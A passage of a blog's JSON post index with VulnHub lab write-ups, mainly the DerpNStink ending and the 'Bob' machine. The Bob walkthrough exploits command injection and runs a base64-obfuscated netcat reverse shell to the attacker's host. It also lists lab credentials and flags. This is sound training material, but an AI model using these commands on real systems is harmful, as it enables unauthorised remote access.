wedgie57```{: .nolineno}Now lets try su stinky again â†’![Untitled](/Vulnhub-Files/img/DERPNSTINK/Untitled%2021.png)![Untitled](/Vulnhub-Files/img/DERPNSTINK/Untitled%2022.png)```bashFlag 3 â†’ flag3(07f62b021771d3cf67e2e1faf18769cc5e5c119ad7d4d1847a11e11d6d5a7ecb)```{: .nolineno}![Untitled](/Vulnhub-Files/img/DERPNSTINK/Untitled%2023.png)Let is import this pcap file to attackers machine â†’![Untitled](/Vulnhub-Files/img/DERPNSTINK/Untitled%2024.png)```bashmrderp â†’ derpderpderpderpderpderpderp```{: .nolineno}![Untitled](/Vulnhub-Files/img/DERPNSTINK/Untitled%2025.png)Now I have created a file name `derpy.sh` â†’**`echo \"/bin/bash\" > derpy.sh`![Untitled](/Vulnhub-Files/img/DERPNSTINK/Untitled%2026.png)![Untitled](/Vulnhub-Files/img/DERPNSTINK/Untitled%2027.png)```bashFlag 4 â†’ flag4(49dca65f362fee401292ed7ada96f96295eab1e589c52e4e66bf4aedda715fdd)```{: .nolineno}After login in wordpress with unclestinky credentials I able to got this at last â†’![Untitled](/Vulnhub-Files/img/DERPNSTINK/Untitled%2028.png)```bashFlag 2 â†’ flag2(a7d355b26bda6bf1196ccffead0b2cf2b81f0a9de5b4876b44407f1dc07e51e6)```{: .nolineno}Finally I am root !!# **Summery Notes â†’**>> - This machine was very good , I enjoyed the password extraction part from mysql server and decrypting the hash of it and getting the password of stinky was Awesome.> - Then Extracting another password from pcap file of user `mrderpy` like old sake . But it was lengthy through.> - Then lastly got the root and all the flags too.> - Very Good machine (Teaches you many things){: .prompt-info }> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Bob", "url": "/posts/Bob/", "categories": "VulnHub", "tags": "Command Injection, gpg, Recon, PrivEsc", "date": "2023-06-11 00:00:00 +0530", "snippet": "## **Description â¤µï¸**> ðŸ’¡ **Difficulty: Beginner/Intermediate â†’** [Bob](https://vulnhub.com/entry/bob-101,226/) Bob is my first CTF VM that I have ever made so be easy on me if it is not perfect....", "content": "## **Description â¤µï¸**> ðŸ’¡ **Difficulty: Beginner/Intermediate â†’** [Bob](https://vulnhub.com/entry/bob-101,226/) Bob is my first CTF VM that I have ever made so be easy on me if it is not perfect. The Milburg Highschool Server has just been attacked, the IT staff have taken down their windows server and are now setting up a linux server running Debian. Could there a few weak points in the new unfinished server?____ Your Goal is to get the flag in / Hints: Remember to look for hidden info/files ## Changelog v1.0 ~ 2018-03-07 v1.0.1 ~ 2018-03-09{: .prompt-info }#### Letâ€™s find the IP Address first >>![Untitled](/Vulnhub-Files/img/Bob/Untitled.png)```bashIP : 10.0.2.18```{: .nolineno}## Port Scan Results âž¡ï¸![Untitled](/Vulnhub-Files/img/Bob/Untitled%201.png)![Untitled](/Vulnhub-Files/img/Bob/Untitled%202.png)```bashOPEN PORTS >80 HTTP (Enumeration Further !)25468 SSH (Hiding the ssh port from changing it is good strategy !)```{: .nolineno}___## Web Enumeration â¤µï¸![Untitled](/Vulnhub-Files/img/Bob/Untitled%203.png)Lets check the robots.txt file â†’![Untitled](/Vulnhub-Files/img/Bob/Untitled%204.png)I will be preparing this payload for checking the `dev_shell.php` file field path with command injection.![Untitled](/Vulnhub-Files/img/Bob/Untitled%205.png)![Untitled](/Vulnhub-Files/img/Bob/Untitled%206.png)Lets try to get the output now â†’ `for command : id`![Untitled](/Vulnhub-Files/img/Bob/Untitled%207.png)Lets try to generate reverse shell from it â†’![Untitled](/Vulnhub-Files/img/Bob/Untitled%208.png)Now let is try the reverse shell Now â†’```bashcommand ->echo \"bmMgMTAuMC4yLjEwIDQ0NDQgLWUgL2Jpbi9iYXNoCg==\" | base64 -d | bash```{: .nolineno}![Untitled](/Vulnhub-Files/img/Bob/Untitled%209.png)Look what I found â†’![Untitled](/Vulnhub-Files/img/Bob/Untitled%2010.png)```bashjc\t:\tQwertyseb\t:\tT1tanium_Pa$$word_Hack3rs_Fear_M3```{: .nolineno}## SSH SHELL â¤µï¸![Untitled](/Vulnhub-Files/img/Bob/Untitled%2011.png)While further enumeration I got the cred for elliot user from its directory.![Untitled](/Vulnhub-Files/img/Bob/Untitled%2012.png)```bashelliot : theadminisdumb```{: .nolineno}After very much enumeration of directories I got this folder and The secret part was the `HARPOCRATES``Harpocrates` was the Greek god of silence, secrets, and confidentiality.![Untitled](/Vulnhub-Files/img/Bob/Untitled%2013.png)Now for extracting this I used this parapharase â†’![Untitled](/Vulnhub-Files/img/Bob/Untitled%2014.png)```bashgpg login.txt.gpggpg --batch --paraphrase HARPOCRATES -d login.txt.gpg```{: .nolineno}![Untitled](/Vulnhub-Files/img/Bob/Untitled%2015.png)_Extracted the password of another user names bob._```bashAnd I got this credential â†’bob\t:\tb0bcat_```{: .nolineno}Lets see how bob can lead us to root â€”>![Untitled](/Vulnhub-Files/img/Bob/Untitled%2016.png)![Untitled](/Vulnhub-Files/img/Bob/Untitled%2017.png)![Untitled](/Vulnhub-Files/img/Bob/Untitled%2018.png)___> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Demo Site", "url": "/posts/normalsite/", "categories": "Demo", "tags": "PrivEsc", "date": "2022-03-04 00:00:00 +0530", "snippet": "# Normal demo Site## These reports are of vulnhub s -> > This is an output for a info type file{: .prompt-info }> Example line for danger prompt.{: .prompt-danger }> Example line for warning pr...", "content": "# Normal demo Site## These reports are of vulnhub s -> > This is an output for a info type file{: .prompt-info }> Example line for danger prompt.{: .prompt-danger }> Example line for warning prompt.{: .prompt-warning }> Example line for tip prompt.{: .prompt-tip }\t`inline code part``/path/to/a/file.extend`{: .filepath}```textThis is a plaintext code snippet.```{: .nolineno}[Google](https://google.com)```mermaidgraph LRA[Square Rect] -- Link text --> B((Circle))A --> C(Round Rect)B --> D{Rhombus}C --> D```{: .nolineno}> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" } ]
